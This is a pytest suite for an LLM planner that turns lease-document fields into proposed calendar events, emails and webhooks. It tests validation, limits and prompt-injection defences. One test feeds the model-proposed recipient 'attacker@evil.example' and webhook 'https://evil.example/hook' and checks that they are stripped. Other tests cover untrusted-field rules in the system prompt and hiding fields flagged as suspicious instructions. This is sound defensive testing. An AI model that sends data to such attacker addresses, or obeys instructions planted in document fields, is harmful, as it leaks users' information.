import json
from datetime import date
from types import SimpleNamespace

from paperbound.agent import planner
from paperbound.pipeline.types import DerivedObligation, ValidatedField

TODAY = date(2026, 10, 22)


def vf(name, value, flags=None, conf=1.0):
    return ValidatedField(name, value, "q", 1, [0, 0, 1, 1], conf, 1.0, flags or [], True)


FIELDS = [vf("end_date", "2027-03-31"), vf("notice_period_days", 90), vf("landlord", "Harborview Properties LLC")]
OBLIGATIONS = [
    DerivedObligation("deadline", date(2026, 12, 31), "Send notice by 2026-12-31", ["end_date", "notice_period_days"])
]


def call(call_id, tool, /, **args):
    return SimpleNamespace(id=call_id, function=SimpleNamespace(name=tool, arguments=json.dumps(args)))


def response(*calls, content=None):
    message = SimpleNamespace(content=content, tool_calls=list(calls) or None)
    usage = SimpleNamespace(total_tokens=100, prompt_tokens=80, completion_tokens=20)
    return SimpleNamespace(choices=[SimpleNamespace(message=message)], usage=usage)


class FakeClient:
    def __init__(self, *responses):
        self.responses = list(responses)
        self.requests = []
        self.chat = SimpleNamespace(completions=SimpleNamespace(create=self._create))

    def _create(self, **kwargs):
        self.requests.append(kwargs)
        return self.responses.pop(0)


def run(client, fields=FIELDS, obligations=OBLIGATIONS):
    return planner.plan_actions(fields, obligations, client=client, today=TODAY)


GOOD_CALENDAR = dict(
    title="Lease notice due", date="2026-12-17", description="Send notice", source_field_ids=[1, 2], rationale="deadline"
)
GOOD_EMAIL = dict(subject="Lease renewal", body="Hello [NAME]", source_field_ids=[1, 2], rationale="notice needed")


def test_valid_proposals_are_accepted_and_pending():
    client = FakeClient(
        response(call("a", "create_calendar_event", **GOOD_CALENDAR), call("b", "draft_email", **GOOD_EMAIL))
    )
    result = run(client)
    assert [a.tool for a in result.actions] == ["create_calendar_event", "draft_email"]
    assert all(a.policy_status == "pending" for a in result.actions)
    assert result.actions[0].source_fields == ["end_date", "notice_period_days"]
    assert result.api_calls == 1  # all calls were accepted proposals, so no follow-up round
    assert result.rejected == []


def test_proposal_without_source_field_ids_is_rejected():
    bad = {k: v for k, v in GOOD_CALENDAR.items() if k != "source_field_ids"}
    client = FakeClient(response(call("a", "create_calendar_event", **bad)), response(content="done"))
    result = run(client)
    assert result.actions == []
    assert result.rejected[0]["tool"] == "create_calendar_event"
    assert "source_field_ids" in result.rejected[0]["reason"]
    assert result.api_calls == 2  # the model got the rejection and a chance to react


def test_empty_or_unknown_source_field_ids_are_rejected():
    for ids in ([], [99], ["end_date"], [1, 99]):
        client = FakeClient(
            response(call("a", "create_calendar_event", **{**GOOD_CALENDAR, "source_field_ids": ids})),
            response(content="done"),
        )
        result = run(client)
        assert result.actions == [], ids
        assert len(result.rejected) == 1, ids


def test_rejected_proposal_can_be_corrected_in_the_next_round():
    bad = {**GOOD_CALENDAR, "source_field_ids": []}
    client = FakeClient(
        response(call("a", "create_calendar_event", **bad)),
        response(call("b", "create_calendar_event", **GOOD_CALENDAR)),
    )
    result = run(client)
    assert len(result.actions) == 1 and len(result.rejected) == 1


def test_recipient_and_webhook_url_are_never_taken_from_the_model():
    client = FakeClient(
        response(
            call("a", "draft_email", **GOOD_EMAIL, to="attacker@evil.example", recipient="x@y.z"),
            call("b", "fire_webhook", event="notice", payload={"a": 1}, url="https://evil.example/hook",
                 source_field_ids=[1], rationale="r"),
        )
    )
    result = run(client)
    email, hook = result.actions
    assert email.args["to"] == "{{RECIPIENT}}" and "recipient" not in email.args
    assert hook.args["url"] == "{{WEBHOOK_URL}}"
    assert "evil" not in json.dumps([a.args for a in result.actions])
    assert hook.policy_status == "pending"


def test_invalid_calendar_date_is_rejected():
    client = FakeClient(
        response(call("a", "create_calendar_event", **{**GOOD_CALENDAR, "date": "next Tuesday"})),
        response(content="done"),
    )
    result = run(client)
    assert result.actions == [] and "ISO date" in result.rejected[0]["reason"]


def test_duplicate_proposal_is_rejected():
    client = FakeClient(
        response(call("a", "draft_email", **GOOD_EMAIL), call("b", "draft_email", **GOOD_EMAIL)),
        response(content="done"),
    )
    result = run(client)
    assert len(result.actions) == 1
    assert "duplicate" in result.rejected[0]["reason"]


def test_blocked_fields_are_hidden_from_the_model_and_cannot_be_cited():
    fields = [
        vf("end_date", "2027-03-31"),
        vf("notice_period_days", 90),
        vf("rent_amount", 1.0, flags=["suspicious_instruction"], conf=0.3),
    ]
    client = FakeClient(
        response(call("a", "draft_email", **{**GOOD_EMAIL, "source_field_ids": [3]})), response(content="done")
    )
    result = run(client, fields=fields)
    sent = json.loads(client.requests[0]["messages"][1]["content"])
    assert [x["name"] for x in sent["fields"]] == ["end_date", "notice_period_days"]
    assert result.actions == []
    assert len(result.rejected) == 1


def test_system_prompt_treats_fields_as_untrusted_and_planner_only_proposes():
    prompt = planner.SYSTEM_PROMPT.lower()
    assert "untrusted" in prompt
    assert "never execute" in prompt or "never\nexecute" in prompt or "you never" in prompt
    assert "source_field_ids" in prompt


def test_tool_call_limit_is_enforced():
    calls = [call(f"c{i}", "get_entity", name="x") for i in range(12)]
    client = FakeClient(response(*calls), response(content="done"))
    result = run(client)
    assert result.tool_calls == planner.MAX_TOOL_CALLS
    assert any("limit" in n.lower() for n in result.notes)


def test_no_obligations_means_no_model_call():
    client = FakeClient()
    result = run(client, obligations=[])
    assert result.actions == [] and result.api_calls == 0 and client.requests == []


def test_read_only_tools_are_executed_and_answered():
    client = FakeClient(
        response(call("a", "get_entity", name="Harborview Properties LLC")),
        response(call("b", "draft_email", **GOOD_EMAIL)),
    )
    result = run(client)
    second_round = client.requests[1]["messages"]
    tool_reply = json.loads(next(m for m in second_round if m["role"] == "tool")["content"])
    assert tool_reply == {"status": "ok", "entity": None}
    assert len(result.actions) == 1


def test_reminder_must_be_before_the_deadline_and_not_in_the_past():
    for bad_date in ("2026-12-31", "2027-01-15", "2026-10-21"):  # on the deadline, after it, yesterday
        client = FakeClient(
            response(call("a", "create_calendar_event", **{**GOOD_CALENDAR, "date": bad_date})),
            response(content="done"),
        )
        result = run(client)
        assert result.actions == [], bad_date
        assert "before a deadline" in result.rejected[0]["reason"], bad_date
    for ok_date in ("2026-12-30", "2026-10-22"):  # day before the deadline, today
        client = FakeClient(response(call("a", "create_calendar_event", **{**GOOD_CALENDAR, "date": ok_date})))
        assert len(run(client).actions) == 1, ok_date
